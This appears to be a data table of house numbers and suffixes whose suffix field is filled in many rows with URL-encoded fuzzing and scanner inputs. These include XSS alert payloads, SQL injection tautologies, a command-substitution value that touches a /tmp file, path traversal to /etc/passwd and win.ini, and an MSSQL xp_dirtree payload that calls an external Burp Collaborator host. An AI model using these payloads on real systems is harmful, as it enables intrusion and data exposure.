Number;Suffix;
2,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22,%221%22];;
4;NULL;
71;NULL;
938;-1E%2b02;
71;NULL;
938;;
25;NULL;
26;A;
938;;
75;;
39;NULL;
22;4;
39;NULL;
3;NULL;
75;;
1;NULL;
938;;
75;;
75;;
50;NULL;
938;%7b%22Cls%22%3a%22null%22,%22A%22%3a%22B%22%7d;
26;A;
83;NULL;
938;;
80;NULL;
938;;
39;NULL;
26;A;
938;;
3;;
25;NULL;
938;;
938;;
1;NULL;
17;NULL;
75;;
68;NULL;
75;;
7;A;
938;;
938;;
938;;
938;;
938;;
7;A;
938;;
5;;
12;NULL;
39;NULL;
41;NULL;
10;;
938;;
75;;
7;A;
7571583378 or 6152=6153-- ;;
10;NULL;
938;;
4;;
19;NULL;
19;NULL;
938;;
938;;
24;NULL;
17;NULL;
1;;
938;;
75;;
938;;
39;NULL;
71;NULL;
7566435905 or 1913=1922;;
938;$(touch%20%2ftmp%2fblns%2efail);
12;;
938;;
28;;
71;NULL;
4;;
31;;
938;;
938;;
39;NULL;
4;NULL;
938;File%3a%2f%2f%2f;
68;NULL;
4;;
39;NULL;
71;NULL;
5;;
938;%3ca%20href%3d%22%5cx1Djavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
71;NULL;
1;NULL;
SyJ3d9TdH8Ycb4hPSGQdArTRIdP9Moywi1Ux/Kzav4o=;;
1;;
12;;
200;;
938;;
24;NULL;
26;A;
243;2;
8;NULL;
75;;
938;;
938;;
327;NULL;
24;NULL;
938;#;Strings%20which%20contain%20misplaced%20quotation%20marks%3b%20can%20cause%20encoding%20errors
12;;
1;;
938;;
36;A;
19;;
7571446103 or 1325=1325-- ;;
3;NULL;
3;;
938;;
5;NULL;
938;;
501;NULL;
938;;
3;NULL;
3;NULL;
750py6mp9x5eÁ52xkxqn2p9;;
6;;
34;a;
22;NULL;
938;;
938;#;Strings%20which%20consists%20of%20Japanese-style%20emoticons%20which%20are%20popular%20on%20the%20web
938;;
938;;
39;NULL;
2;NULL;
3;NULL;
5;;
45;NULL;
1;NULL;
1;NULL;
1;;
923;;
71;NULL;
39;NULL;
83;NULL;
1;;
938;;
34;a;
938;;
0xffffffff;;
4;;
938;%22%60'%3e%3cscript%3e%5cxEF%5cxBF%5cxAEjavascript%3aalert(1)%3c%2fscript%3e;
150;NULL;
150;;
938;-1,00E+02;
7;;
48;;
71;NULL;
1;NULL;
1;;
247;NULL;
75;;
47;;
938;;
42;A;
938;;
68;NULL;
20;NULL;
20;NULL;
7;;
75;;
6;B;
938;;
26;A;
938;;
938;;
501;NULL;
150;NULL;
1;NULL;
938;%22%3e%3cscript%3ealert(123)%3c%2fscript%3e;
3;T;
75;;
r96m1{{224|add:219}}tb232;;
8;NULL;
938;20%;
38;A;
200;;
8;NULL;
75;qu212[[266*848]]hozrf;
938;;
1;NULL;
938;;
938;%3balert(123)%3b;
75;../../../../../../../../../../../../../../../../etc/passwd;
938;;
12;NULL;
39;NULL;
#NAME?;;
54;;
3;NULL;
75;%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini;
75;;
184;NULL;
938;;
8;Skûtmakker;
2;NULL;
3;NULL;
75;;
938;;
10;;
2;NULL;
938;;
7;NULL;
14;;
75;;
938;;
1;B;
68;NULL;
68;NULL;
938;;
26;A;
17;NULL;
938;%3ca%20href%3dhttp%3a%2f%2ffoo%2ebar%2f#x%3d%60y%3e%3c%2fa%3e%3cimg%20alt%3d%22%60%3e%3cimg%20src%3dx%3ax%20onerror%3djavascript%3aalert(1)%3e%3c%2fa%3e%22%3e;
18;;
938;;
9;NULL;
39;NULL;
43;NULL;
938;0,,0;
5;;
1;NULL;
938;;
36;;
24;NULL;
9;NULL;
24;NULL;
938;;
24;NULL;
5;;
3;;
31;;
938;;
200;;
938;;
1;;
938;;
212;NULL;
75;;
37;A;
938;;
1;NULL;
10;NULL;
425;;
75;;
97;-6a;
75;;
26;A;
938;;
4;;
22;a;
3;NULL;
938;#;Strings%20which%20contain%20unicode%20numbers%3b%20if%20the%20code%20is%20localized,%20it%20should%20see%20the%20input%20as%20numeric
938;;
8;NULL;
1;;
26;A;
247;NULL;
430;;
938;;
9;NULL;
123;;
7;A;
1;NULL;
938;;
938;-1%2f2;
75;;
26;A;
39;NULL;
24;3;
68;NULL;
15;NULL;
20;;
938;;
938;#;Strings%20which%20may%20cause%20human%20to%20reinterpret%20worldview
17;NULL;
31;;
9;NULL;
4;NULL;
39;NULL;
71;NULL;
93;;
938;;
22;NULL;
17;NULL;
938;;
938;;
20;NULL;
80;NULL;
17;NULL;
68;NULL;
1;NULL;
80;NULL;
68;NULL;
39;NULL;
39;NULL;
236;;
14;;
179;NULL;
938;;
938;;
1;NULL;
938;%3ca%20href%3d%22%5cx1Bjavascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
80;NULL;
45;D;
1;NULL;
10;;
71;NULL;
75;;
3;NULL;
65;NULL;
83;NULL;
83;NULL;
938;;
938;;
75 and 4099=4099;;
938;;
19;NULL;
8;;
34;a;
938;;
20;NULL;
17;NULL;
938;;
26;A;
19;NULL;
34;a;
938;𝓣𝓱𝓮%20𝓺𝓾𝓲𝓬𝓴%20𝓫𝓻𝓸𝔀𝓷%20𝓯𝓸𝔁%20𝓳𝓾𝓶𝓹𝓼%20𝓸𝓿𝓮𝓻%20𝓽𝓱𝓮%20𝓵𝓪𝔃𝔂%20𝓭𝓸𝓰;
9;NULL;
24;NULL;
938;;
938;;
938;;
938;0%2f0;
68;;
938;;
1;;
938;;
1;NULL;
26;A;
938;%3cIMG%20SRC%3d%26#106%3b%26#97%3b%26#118%3b%26#97%3b%26#115%3b%26#99%3b%26#114%3b%26#105%3b%26#112%3b%26#116%3b%26#58%3b%26#97%3b%26#108%3b%26#101%3b%26#114%3b%26#116%3b%26#40%3b%26#39%3b%26#88%3b%26#83%3b%26#83%3b%26#39%3b%26#41%3b%3e;
938;;
20;NULL;
938;;
22;-4;
200;;
25;NULL;
938;₀₁₂;
19;NULL;
938;;
2;;
68;NULL;
80;NULL;
75;;
8;NULL;
938;;
938;COM4;
2;NULL;
2;NULL;
75;;
2;NULL;
75;;
75;;
7;A;
71;NULL;
2;NULL;
124;;
75;;
39;NULL;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
938;-1,00E+02;
75;"'+(function(){if(typeof r42r2===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);r42r2=1;}}())+'";
68;NULL;
xvOsV5RKUxSQzTmQLQ93dxX9AF76yaMGItX1IF5/aJQ=;;
75;;
13;NULL;
938;;
150;NULL;
3;NULL;
75;;
938;;
327;NULL;
3;NULL;
938;;
80;NULL;
938;;
68;NULL;
231;A;
75;;
12;;
3;NULL;
938;;
4;NULL;
9;NULL;
39;NULL;
938;src%3dJaVaSCript%3aprompt(132);
501;NULL;
938;;
68;;
3;NULL;
68;NULL;
938;;
75;;
5;;
4;NULL;
938;;
3;NULL;
71;NULL;
75;;
75;.../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\.../.\windows/win.ini;
26;A;
142;;
75;;
111;;
39;NULL;
17;NULL;
10;;
71;NULL;
23;;
3;;
68;NULL;
309;;
938;;
25;NULL;
39;NULL;
9;NULL;
938;#NAME?;
3;2;
938;;
938;%22%60'%3e%3cscript%3e%5cxEF%5cxBF%5cxBEjavascript%3aalert(1)%3c%2fscript%3e;
68;NULL;
938;;
938;;
938;;
938;%3cimg%20src%5cx47%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
45;NULL;
4;NULL;
938;;
425;;
75;;
96;;
25;;
938;;
68;NULL;
22;NULL;
1;NULL;
938;;
938;;
2;;
938;9;
938;#%20version%208%2e0%2e0),%20plus%20U%2b0009%20(HT),%20U%2b000B%20(VT),%20U%2b000C%20(FF),%20U%2b0085%20(NEL),;
938;ABC%3cdiv%20style%3d%22x%3aexp%5cx5Cression(javascript%3aalert(1)%22%3eDEF;
8;;
0;;
2;;
938;System(%22ls%20-al%20%2f%22);
3;NULL;
938;;
938;;
150;NULL;
75;;
39;NULL;
9;NULL;
39;NULL;
45;NULL;
6;NULL;
1;NULL;
68;NULL;
938;;
3;NULL;
4;NULL;
4;NULL;
3;NULL;
39;NULL;
7;;
938;;
938;%3cimg%20src%5cx09%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
25;NULL;
83;NULL;
938;;
19;;
938;;
938;;
7553347789' or 5001=5001'-- ;;
19;;
1;NULL;
75';;
938;;
938;;
17;NULL;
3;;
3;NULL;
8;NULL;
4;;
3;NULL;
938;;
2;NULL;
123;;
938;;
1;NULL;
150;NULL;
71;NULL;
938;;
80;NULL;
539;;
93;;
938;;
88;A;
938;;
1;;
26;A;
938;;
17;NULL;
7;A;
4;;
8;NULL;
80;NULL;
938;;
54;;
7;A;
20;NULL;
17;NULL;
1;NULL;
13;A;
25;NULL;
9;;
75;;
1;NULL;
1;NULL;
1;NULL;
19;NULL;
938;;
938;;
938;;
88;C;
75;;
7;A;
26;A;
938;;
938;;
24;NULL;
83;NULL;
71;NULL;
25;;
75;;
938;社會科學院語學研究所;
938;;
83;NULL;
20;NULL;
9;;
2;;
20;;
25;NULL;
1;NULL;
3;;
5;;
938;;
938;;
9;NULL;
5;;
17;NULL;
19;NULL;
938;;
938;;
99;;
18;;
94;;
4;NULL;
34;a;
277;;
26;A;
25;NULL;
938;;
3;NULL;
24;NULL;
1;NULL;
22;a;
11;;
83;NULL;
39;NULL;
2;NULL;
71;NULL;
68;NULL;
2;NULL;
39;NULL;
938;;
4;NULL;
39;NULL;
83;NULL;
24;NULL;
75;");declare @q varchar(99);set @q='\\quo04m8ocf7myb3yt1c95bkqdhjb72vtnhf47sw.burpcollab'+'orator.net\fxg'; exec master.dbo.xp_dirtree @q;-- ";
71;NULL;
75;;
38;A;
4;NULL;
3;NULL;
1;;
7;;
83;NULL;
938;;
71;NULL;
938;;
39;NULL;
938;%3csc%3cscript%3eript%3ealert(123)%3c%2fsc%3c%2fscript%3eript%3e;
9;NULL;
75;;
39;NULL;
9;3;
32;;
938;;
45;NULL;
17;NULL;
75;;
17;NULL;
938;;
4;;
938;Lightwater%20Country%20Park;
75;;
75;;
45;NULL;
3;NULL;
938;;
938;;
39;NULL;
3;T;
25;NULL;
3;;
938;;
938;;
2;NULL;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cxA8javascript%3aalert(1)%3c%2fscript%3e;
36;H;
120;;
17;NULL;
3;NULL;
22;a;
39;NULL;
938;#;SQL%20Injection
99;;
247;NULL;
75;;
5;NULL;
75;;
17;NULL;
938;%3cscript%5cx2Ftype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e;
39;NULL;
938;;
26;A;
12;;
9;NULL;
1;NULL;
75;;
4;NULL;
938;;
24;NULL;
3;NULL;
25;NULL;
938;;
8;NULL;
938;%3c!--[if]%3e%3cscript%3ejavascript%3aalert(1)%3c%2fscript%20--%3e;
21;D;
938;;
1;NULL;
75;;
39;NULL;
938;#;Zalgo%20Text
200;;
54;;
22;a;
71;NULL;
1;NULL;
25;1;
26;A;
12;NULL;
35;;
938;;
1;NULL;
5;a;
22;NULL;
1;NULL;
938;;
80;NULL;
938;;
68;NULL;
938;;
1;;
938;;
938;;
938;;
938;;
3;NULL;
38;de Heun 38;
22;a;
80;NULL;
75;;
938;#;File%20Inclusion
24;NULL;
938;;
1;;
75;;
938;00˙Ɩ$-;
17;NULL;
938;;
26;A;
3;NULL;
2;NULL;
19;;
15;A;
938;;
14;;
938;;
13;NULL;
938;;
19;NULL;
938;Kernel%2eexec(%22ls%20-al%20%2f%22);
938;;
938;;
938;%3cimg%20src%3dx%20onerror%3d%5cx12%22javascript%3aalert(1)%22%3e;
68;NULL;
26;A;
4;NULL;
25;B;
5;NULL;
63;A;
1;;
68;NULL;
17;NULL;
71;NULL;
39;NULL;
4;NULL;
84;;
34;a;
79;;
TRUE;;
1;NULL;
938;#%20The%20next%20line%20may%20be%20flagged%20for%20%22trailing%20whitespace%22%20in%20some%20viewers%2e;
938;;
938;;
24;NULL;
8;NULL;
938;;
83;NULL;
938;;
24;NULL;
938;;
80;NULL;
14;;
39;NULL;
83;NULL;
5;NULL;
938;;
22;B;
3;NULL;
2;NULL;
75;;
41;;
938;-;
34;a;
938;;
19;;
8;NULL;
71;NULL;
0;;
938;;
9;NULL;
75;;
938;;
501;NULL;
10;;
4;NULL;
938;;
938;;
115;;
2;;
938;#%20or%20reused%20for%20internal%20delimiters%20on%20the%20theory%20that%20they%20should%20never;
938;%7b%22Klass%22%3a%22null%22,%22A%22%3a%22B%22%7d;
21;NULL;
938;;
938;;
938;Ⱥ;
75;;
71;NULL;
1;NULL;
7;NULL;
19;NULL;
10;NULL;
938;%3cu%20oncopy%3dalert()%3e%20Copy%20me%3c%2fu%3e;
938;;
115;;
2;;
938;;
24;3;
10;;
80;NULL;
4;E;
938;;
938;%22%60'%3e%3cscript%3e%5cx00javascript%3aalert(1)%3c%2fscript%3e;
24;NULL;
1HNeOiZeFu7gP1lxi5tdAwGcB9i2xR+Q2jpmbuwTqzU=;;
938;TRUE;
200;;
1;;
938;0%2e%2e0;
5;a;
34;a;
938;NUL;
1;NULL;
938;;
501;NULL;
3;NULL;
938;#;
188;;
19;;
938;;
3;NULL;
26;A;
17;;
